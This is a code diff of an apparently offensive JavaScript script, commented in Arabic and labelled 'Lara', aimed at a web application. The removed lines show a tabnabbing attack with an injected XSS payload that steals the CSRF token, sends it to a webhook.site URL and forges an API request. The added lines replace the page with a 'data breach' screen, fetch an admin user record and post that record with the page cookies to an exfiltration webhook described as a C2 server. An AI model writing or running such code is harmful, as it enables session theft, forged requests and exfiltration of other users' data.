@@ -1,14 +1,41 @@
-// 1. طباعة علامة لارا في كونسول الصفحة الجديدة
-console.log("Lara: Acting from the new tab...");
+(async () => {
+    // 1. مسح واجهة الصفحة فوراً
+    document.documentElement.innerHTML = `
+        <body style="background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:monospace;">
+            <div style="text-align:center;">
+                <h1 style="text-shadow:0 0 10px #0f0;">LARA: DATA BREACH IN PROGRESS</h1>
+                <p id="status">Fetching sensitive data...</p>
+            </div>
+        </body>`;
 
-if (window.opener) {
-    // 2. تغيير محتوى الصفحة الأصلية (الضحية لا تزال هناك!)
-    window.opener.document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:100px;'>Hacked by<img src="ssqeew.png" onerror="(function(){const t=document.querySelector('meta[name=\'csrf-token\']')?.content;if(!t){alert('Token Not Found');return;}fetch('https://webhook.site/797b8441-6a62-471c-9271-4b365d46053a',{method:'POST',mode:'no-cors',body:t});fetch('/api/v1/sketches/1/',{method:'POST',headers:{'Content-Type':'application/json','X-CSRFToken':t},body:JSON.stringify({name:'rrrrrrr',description:''})}).then(r=>alert('Done! Status: '+r.status));})();"> <script>alert(300);</script></h1>";
-    
-    // 3. سرقة الكوكيز من الصفحة الأصلية وإرسالها
-    const cookies = window.opener.document.cookie;
-    console.log("Lara: Cookies from original page:", cookies);
-    
-    // 4. إغلاق النافذة الجديدة فوراً لكي لا يشعر المستخدم بشيء
-    // window.close(); 
-}
+    try {
+        // 2. طلب البيانات من الهدف (Target API)
+        const targetUrl = 'https://test.lirati.app/admin/users/2773';
+        const response = await fetch(targetUrl);
+        const userData = await response.text(); // نأخذ النتيجة كنص
+
+        document.getElementById('status').innerText = "Data acquired. Sending to C2 server...";
+
+        // 3. إرسال البيانات المسروقة إلى الـ Webhook الخاص بك
+        // استبدل الرابط أدناه برابط الـ Webhook الذي تريد استقبال البيانات عليه
+        const myWebhook = 'https://your-exfil-webhook.beeceptor.com'; 
+        
+        await fetch(myWebhook, {
+            method: 'POST',
+            mode: 'no-cors', // نستخدم no-cors لتجنب مشاكل التصريح في بعض الحالات
+            body: JSON.stringify({
+                victim: window.location.hostname,
+                path: targetUrl,
+                exfiltrated_data: userData,
+                cookies: document.cookie
+            })
+        });
+
+        document.getElementById('status').innerText = "LARA: Operation Complete. Data Exfiltrated.";
+        console.log("Lara: Mission accomplished.");
+
+    } catch (e) {
+        document.getElementById('status').style.color = "red";
+        document.getElementById('status').innerText = "LARA: ERROR - " + e.message;
+    }
+})();
